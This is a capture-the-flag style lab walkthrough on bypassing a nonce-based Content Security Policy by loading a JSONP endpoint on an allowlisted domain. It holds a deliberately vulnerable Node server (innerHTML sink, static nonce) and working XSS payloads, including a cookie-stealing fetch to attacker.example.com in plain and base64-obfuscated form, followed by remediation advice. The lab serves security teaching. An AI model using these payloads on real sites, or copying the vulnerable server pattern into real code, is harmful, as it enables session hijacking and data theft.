# Lab 02 — CSP Bypass via JSONP Endpoint

## Objective

Bypass a nonce-based CSP that whitelists `accounts.google.com` by exploiting a known JSONP endpoint on the whitelisted domain to execute arbitrary JavaScript.

---

## Prerequisites

- Understanding of Content Security Policy directives
- Familiarity with JSONP and how browsers execute `<script>` responses
- Burp Suite or `curl` for request inspection

---

## The Target Policy

```
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-r4nd0mN0nc3' https://accounts.google.com;
  style-src 'self';
  img-src 'self';
  base-uri 'none';
  object-src 'none';
```

This policy:
- Allows inline scripts only with nonce `r4nd0mN0nc3`
- Allows scripts from `accounts.google.com`
- Does not include `unsafe-inline` or `unsafe-eval`

---

## Setup

### Option A: Docker

```bash
docker run -d -p 8080:8080 --name lab02-csp-bypass \
  node:18-alpine sh -c "
    mkdir /app && cat > /app/server.js << 'EOF'
const http = require('http');

const HTML = \`<!DOCTYPE html>
<html>
<head>
  <title>Secure Notes App</title>
</head>
<body>
  <h1>Notes</h1>
  <div id='notes'></div>

  <h2>Add a note:</h2>
  <form id='noteForm'>
    <textarea name='note' placeholder='Enter your note...'></textarea>
    <button type='submit'>Save</button>
  </form>

  <div id='preview'></div>

  <script nonce='r4nd0mN0nc3'>
    // Note preview — renders user input to allow basic formatting
    document.getElementById('noteForm').onsubmit = function(e) {
      e.preventDefault();
      const note = e.target.note.value;
      // VULNERABLE: note content rendered as HTML
      document.getElementById('preview').innerHTML = '<strong>Preview:</strong><br>' + note;
    };
  </script>
</body>
</html>\`;

http.createServer((req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/html',
    'Content-Security-Policy': \"default-src 'none'; script-src 'nonce-r4nd0mN0nc3' https://accounts.google.com; style-src 'self'; img-src 'self'; base-uri 'none'; object-src 'none';\"
  });
  res.end(HTML);
}).listen(8080);
console.log('Lab running on http://localhost:8080');
EOF
    node /app/server.js
  "
```

### Option B: Local Node.js

```bash
mkdir lab02 && cd lab02
cat > server.js << 'HEREDOC'
const http = require('http');

const NONCE = 'r4nd0mN0nc3';  // intentionally static for lab purposes
const HTML = `<!DOCTYPE html>
<html>
<head><title>Secure Notes App</title></head>
<body>
  <h1>Notes</h1>
  <div id='notes'></div>
  <h2>Add a note:</h2>
  <form id='noteForm'>
    <textarea name='note' placeholder='Enter your note...'></textarea>
    <button type='submit'>Save</button>
  </form>
  <div id='preview'></div>
  <script nonce='${NONCE}'>
    document.getElementById('noteForm').onsubmit = function(e) {
      e.preventDefault();
      const note = e.target.note.value;
      document.getElementById('preview').innerHTML = '<strong>Preview:</strong><br>' + note;
    };
  </script>
</body>
</html>`;

http.createServer((req, res) => {
  res.writeHead(200, {
    'Content-Type': 'text/html',
    'Content-Security-Policy': `default-src 'none'; script-src 'nonce-${NONCE}' https://accounts.google.com; style-src 'self'; img-src 'self'; base-uri 'none'; object-src 'none';`
  });
  res.end(HTML);
}).listen(8080, () => console.log('Lab running on http://localhost:8080'));
HEREDOC

node server.js
```

---

## Step-by-Step Walkthrough

### Step 1: Confirm HTML Injection

Enter the following in the note textarea and click Save:

```html
<b>bold text</b>
```

If the word "bold text" renders in bold, HTML injection is confirmed. The `innerHTML` assignment in the JavaScript is the sink.

### Step 2: Confirm Script Injection is Blocked

Try injecting a script:

```html
<script>alert(1)</script>
```

Open DevTools → Console. You should see a CSP violation:

```
Refused to execute inline script because it violates the following Content Security Policy directive: "script-src 'nonce-r4nd0mN0nc3' https://accounts.google.com"
```

The CSP is working for direct `<script>` injection.

### Step 3: Read the CSP

Open DevTools → Network → reload the page → click the HTML response → Headers tab:

```
Content-Security-Policy: default-src 'none'; script-src 'nonce-r4nd0mN0nc3' https://accounts.google.com; ...
```

`accounts.google.com` is whitelisted in `script-src`. This is the bypass target.

### Step 4: Identify the JSONP Endpoint

`accounts.google.com/o/oauth2/revoke` is a known JSONP endpoint:

```bash
curl "https://accounts.google.com/o/oauth2/revoke?callback=test"
# Response: test({"error":"invalid_token"});
# The callback parameter is reflected as the function name in the response
```

The response Content-Type is typically `application/json` or `text/javascript`. Browsers will execute it as JavaScript when loaded via `<script src>`.

### Step 5: Craft the Bypass

Inject into the note textarea:

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)//"></script>
```

The `//` at the end comments out the `({"error":"invalid_token"});` that the endpoint appends, so the full response is:

```javascript
alert(document.domain)//({"error":"invalid_token"});
```

`alert(document.domain)` executes, then `//` comments out the rest. The `<script>` tag is allowed by CSP because `src` is `accounts.google.com`.

### Step 6: Escalate to Cookie Theft

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=fetch('https://attacker.example.com/c%3Fd%3D'%2Bdocument.cookie)//"></script>
```

Or use a wrapper function that encodes the payload:

```html
<script src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob('ZmV0Y2goJ2h0dHBzOi8vYXR0YWNrZXIuZXhhbXBsZS5jb20vYz9kPScrZG9jdW1lbnQuY29va2llKQ=='))//"></script>
```

The `atob(...)` decodes to `fetch('https://attacker.example.com/c?d='+document.cookie)`.

---

## Solution

The CSP whitelists `accounts.google.com` in `script-src`. The endpoint `https://accounts.google.com/o/oauth2/revoke?callback=PAYLOAD` reflects the callback value as executable JavaScript. A `<script src>` tag pointing to this URL bypasses the CSP while executing the attacker's payload.

---

## Remediation

**Fix 1: Remove the JSONP-vulnerable domain from the allowlist**

If `accounts.google.com` is only needed for OAuth flows, load it from your own server-side proxy or use the `nonce`-only approach.

**Fix 2: Use `'strict-dynamic'` with a nonce only — no domain allowlists**

```
script-src 'nonce-{RANDOM_PER_REQUEST}' 'strict-dynamic';
```

With `strict-dynamic`, domain allowlists are ignored when a valid nonce is present. This prevents JSONP endpoint abuse from any domain.

**Fix 3: Fix the innerHTML sink**

```javascript
// Replace:
document.getElementById('preview').innerHTML = '<strong>Preview:</strong><br>' + note;

// With:
const preview = document.getElementById('preview');
preview.textContent = '';
const label = document.createElement('strong');
label.textContent = 'Preview:';
preview.appendChild(label);
preview.appendChild(document.createTextNode('\n' + note));
```

**Fix 4: Generate random nonces per request**

```javascript
const crypto = require('crypto');
const nonce = crypto.randomBytes(16).toString('base64');
// Use nonce in both the CSP header and the <script nonce="..."> attribute
```

---

## References

- [OWASP CSP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)
- [Bypassing CSP with Script Gadgets — Lekies et al.](https://research.google/pubs/pub45542/)
- [JSONBee — JSONP Endpoints Database](https://github.com/zigoo0/JSONBee)
- [strict-dynamic Explainer — W3C](https://www.w3.org/TR/CSP3/#strict-dynamic-usage)
